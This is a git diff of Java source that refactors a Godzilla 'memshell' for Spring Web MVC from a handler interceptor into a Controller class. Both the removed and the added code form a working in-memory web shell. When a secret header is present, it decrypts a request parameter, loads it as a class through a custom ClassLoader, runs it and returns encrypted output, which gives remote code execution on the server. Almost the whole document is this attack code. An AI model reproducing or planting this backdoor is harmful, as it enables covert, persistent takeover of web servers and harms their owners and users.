@@ -1,7 +1,7 @@
-package com.reajason.javaweb.memshell.springmvc.godzilla;
+package com.reajason.javaweb.memshell.springwebmvc.godzilla;
 
-import org.springframework.web.servlet.AsyncHandlerInterceptor;
 import org.springframework.web.servlet.ModelAndView;
+import org.springframework.web.servlet.mvc.Controller;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
@@ -14,62 +14,47 @@ import java.io.ByteArrayOutputStream;
  * @author ReaJason
  * @since 2024/12/22
  */
-public class GodzillaInterceptor extends ClassLoader implements AsyncHandlerInterceptor {
+public class GodzillaControllerHandler extends ClassLoader implements Controller {
     public static String key;
     public static String pass;
     public static String md5;
     public static String headerName;
     public static String headerValue;
 
-    public GodzillaInterceptor(ClassLoader c) {
-        super(c);
+    public GodzillaControllerHandler() {
     }
 
-    public GodzillaInterceptor() {
+    public GodzillaControllerHandler(ClassLoader parent) {
+        super(parent);
     }
 
-    @Override
-    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
-        try {
-            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
-                HttpSession session = request.getSession();
-                byte[] data = base64Decode(request.getParameter(pass));
-                data = this.x(data, false);
-                if (session.getAttribute("payload") == null) {
-                    session.setAttribute("payload", (new GodzillaInterceptor(this.getClass().getClassLoader())).Q(data));
-                } else {
-                    request.setAttribute("parameters", data);
-                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                    Object f;
-                    try {
-                        f = ((Class<?>) session.getAttribute("payload")).newInstance();
-                    } catch (Exception e) {
-                        throw new RuntimeException(e);
-                    }
-                    f.equals(arrOut);
-                    f.equals(request);
-                    response.getWriter().write(md5.substring(0, 16));
-                    f.toString();
-                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
-                    response.getWriter().write(md5.substring(16));
+    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
+        if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
+            HttpSession session = request.getSession();
+            byte[] data = base64Decode(request.getParameter(pass));
+            data = this.x(data, false);
+            if (session.getAttribute("payload") == null) {
+                session.setAttribute("payload", (new GodzillaControllerHandler(this.getClass().getClassLoader())).Q(data));
+            } else {
+                request.setAttribute("parameters", data);
+                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
+                Object f;
+                try {
+                    f = ((Class<?>) session.getAttribute("payload")).newInstance();
+                } catch (Exception e) {
+                    throw new RuntimeException(e);
                 }
-                return false;
+                f.equals(arrOut);
+                f.equals(request);
+                response.getWriter().write(md5.substring(0, 16));
+                f.toString();
+                response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
+                response.getWriter().write(md5.substring(16));
             }
-        } catch (Exception e) {
-            e.printStackTrace();
         }
-        return true;
+        return null;
     }
 
-    @Override
-    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
-
-    }
-
-    @Override
-    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
-
-    }
 
     @SuppressWarnings("all")
     public static String base64Encode(byte[] bs) throws Exception {
@@ -123,10 +108,5 @@ public class GodzillaInterceptor extends ClassLoader implements AsyncHandlerInte
         } catch (Exception var4) {
             return null;
         }
-    }
-
-    @Override
-    public void afterConcurrentHandlingStarted(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
-
     }
 }
